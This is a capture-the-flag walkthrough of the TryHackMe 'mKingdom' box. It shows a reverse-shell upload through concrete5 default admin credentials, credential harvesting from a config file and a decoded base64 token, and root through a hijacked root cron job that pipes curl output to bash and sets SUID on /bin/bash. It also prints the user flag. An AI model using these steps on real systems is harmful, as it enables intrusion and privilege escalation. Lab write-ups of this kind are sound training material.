@@ -1,0 +1,139 @@
+So today we are going to solve another challenge from tryhackme itself.
+Which is an easy one mkingdom so let's move with it
+
+Main IP :: 10.48.167.168
+
+Starting with the full port scan and will go deeper once we have the information
+
+Nmap scan report for ip-10-48-167-168.ap-south-1.compute.internal (10.48.167.168)
+Host is up (0.00051s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+85/tcp open  mit-ml-dev
+
+this is interesting 
+
+let's perform SERVICE and version scan
+
+Nmap scan report for ip-10-48-167-168.ap-south-1.compute.internal (10.48.167.168)
+Host is up, received echo-reply ttl 64 (0.00035s latency).
+Scanned at 2026-05-21 08:24:51 UTC for 6s
+
+PORT   STATE SERVICE REASON         VERSION
+85/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: 0H N0! PWN3D 4G4IN
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+
+
+So we ran ffuf and got /app only when we visit this part we get jump and after that we are at http://10.48.167.168:85/app/castle/
+
+moving let's fuzz more after /app
+
+and below at bottom of the page we just have a login page and we came to know that there is cms named conrete5
+
+Built with concrete5 CMS.
+
+and on header it says toad's website maybe username let's see what is it.
+
+So for we know that concrete5 is vulnerable to rce but you must be admin or thing that way so let's move with it before we find that for this cms of concrete if not well configured it has a admin:password creds so logiing with it
+
+so on systems and settings we add .php in allowed file types and then\
+
+so we use revshell from pentest monkey and got rev shell
+
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.48.167.168 48048
+ls
+rev2.php
+whoami
+www-data
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@mkingdom:/var/www/html/app/castle/application/files/7317/7935/3577$ ^Z
+[1]+  Stopped                 nc -lvnp 4444
+root@ip-10-48-95-88:~# stty raw -echo; fg
+nc -lvnp 4444
+
+www-data@mkingdom:/var/www/html/app/castle/application/files/731<html/app/castle/application/files/7317/7935/3577$ e            xport TERM=xterm-256color
+www-data@mkingdom:/var/www/html/app/castle/application/files/7317/7935/3577$ 
+
+shell stabilized.
+
+w-data@mkingdom:/var/www/html/app/castle/application/config$ cat database.php 
+<?php
+
+return [
+    'default-connection' => 'concrete',
+    'connections' => [
+        'concrete' => [
+            'driver' => 'c5_pdo_mysql',
+            'server' => 'localhost',
+            'database' => 'mKingdom',
+            'username' => 'toad',
+            'password' => 'toadisthebest',
+            'character_set' => 'utf8',
+            'collation' => 'utf8_unicode_ci',
+        ],
+    ],
+];
+
+
+so upgrading user shell from www-data to toad
+
+now once we are toad we can move to /home/toad and see .mysql history so we did ss -tulnp
+
+with this we find that port 3306 is also open so we went to mysql and let's move around too
+
+but it turns out to be rabbit hole moving further
+
+so running linpeas.sh on to the system.
+
+let's see what more now we can find
+
+PWD_token=aWthVGVOVEFOdEVTCg== we find this while running linpeas let's try for mario user it's base64 ikaTeNTANtES
+
+/usr/lib/klibc/bin/cat user.txt 
+thm{030a769febb1b3291da1375234b84283}
+mario@mkingdom:~$ 
+
+PRIVILEDGE ESCALATION TIME::
+
+so for that i have got the hint of using pspy64 which is an utility that can look for all running linux processes for all not only for root you can basically spy on root processes
+
+05:18:01 CMD: UID=0     PID=19860  | curl mkingdom.thm:85/app/castle/application/counter.sh 
+2026/05/21 05:18:01 CMD: UID=0     PID=19859  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
+
+so we get this means it is trying to fetch some of the data from mkingdom.thm:85 so let's do one thing create an own mkindgdom with our own ip and once it calls it we will get the data
+
+
+/# # Create the directory structure that the cron job looks for
+mkdir -p /tmp/app/castle/application
+# Create the script file
+nano /tmp/app/castle/application/counter.sh
+
+-95-88:/tmp/app/castle/application# cat counter.sh 
+#! /usr/bin/env bash
+
+# Set SUID bit on /bin/bash binary
+chmod 4755 /bin/bash
+
+
+root@ip-10-48-95-88:/# sudo python3 -m http.server 85 --direcotry /tmp 
+usage: server.py [-h] [--cgi] [-b ADDRESS] [-d DIRECTORY] [-p VERSION] [port]
+server.py: error: unrecognized arguments: --direcotry /tmp
+root@ip-10-48-95-88:/# sudo python3 -m http.server 85 --directry /tmp
+usage: server.py [-h] [--cgi] [-b ADDRESS] [-d DIRECTORY] [-p VERSION] [port]
+server.py: error: unrecognized arguments: --directry /tmp
+root@ip-10-48-95-88:/# sudo python3 -m http.server 85 --directory /tmp
+Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
+10.48.167.168 - - [21/May/2026 09:46:01] "GET /app/castle/application/counter.sh HTTP/1.1" 200 -
+
+gdom:/tmp$ ls -la /bin/bash 
+-rwsr-xr-x 1 root root 1021112 May 16  2017 /bin/bash
+mario@mkingdom:/tmp$ /bin/bash -ip
+bash-4.3# 
+
+
